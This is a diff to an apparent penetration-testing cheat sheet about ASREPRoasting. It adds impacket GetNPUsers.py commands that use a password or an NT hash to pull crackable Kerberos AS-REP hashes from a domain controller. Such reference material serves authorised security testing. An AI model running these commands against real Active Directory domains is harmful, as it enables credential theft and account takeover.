@@ -11,6 +11,16 @@ GetNPUsers.py -usersfile <users_file|users.txt> -outputfile hashes.asreproast <d
 netexec ldap <TARGETS> -u <USER> -p <PASSWORD> --kerberoasting ASREPRoastables.txt --kdcHost <KeyDistributionCenter>
 ```
 
+## ASREPRoasting users list dynamically queried with a LDAP authenticated bind (password)
+```
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'
+```
+
+## ASREPRoasting users list dynamically queried with a LDAP authenticated bind (NT hash)
+```
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
+```
+
 
 ## Crack ASREPRoast
 ```
